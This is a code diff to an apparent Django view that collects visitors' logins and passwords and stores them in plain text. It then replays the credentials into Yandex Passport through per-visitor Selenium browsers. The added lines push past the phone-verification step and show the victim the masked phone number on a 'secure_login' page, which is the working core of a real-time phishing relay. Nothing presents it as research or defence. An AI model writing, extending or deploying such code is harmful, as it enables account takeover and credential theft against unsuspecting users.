@@ -22,10 +22,16 @@ async def index(request):
             phone = request.POST.get('phone')
 
             if password:
-                await asyncio.to_thread(sign_in, driver, login, password)
+                driver = await asyncio.to_thread(sign_in, driver, login, password)
                 custom_user = CustomUser(login=login, password=password)
                 await sync_to_async(custom_user.save)()
-
+                phone_secure = WebDriverWait(driver, 10).until(
+                    EC.presence_of_element_located((By.TAG_NAME, "strong"))
+                )
+                phone_submit = driver.find_element(By.TAG_NAME, "button")
+                phone_submit.click()
+                return await sync_to_async(render)(request, 'secure_login.html',
+                                                   {'phone_number': phone_secure.text})
             elif login:
                 await asyncio.to_thread(open_yandex_passport, driver)
                 username_login = WebDriverWait(driver, 10).until(
@@ -70,6 +76,7 @@ def sign_in(driver, login, password):
     password_submit = driver.find_element(By.ID, "passp:sign-in")
     username_password.send_keys(password)
     password_submit.click()
+    return driver
 
 async def get_driver(request, client_ip):
     if client_ip not in selenium_drivers:
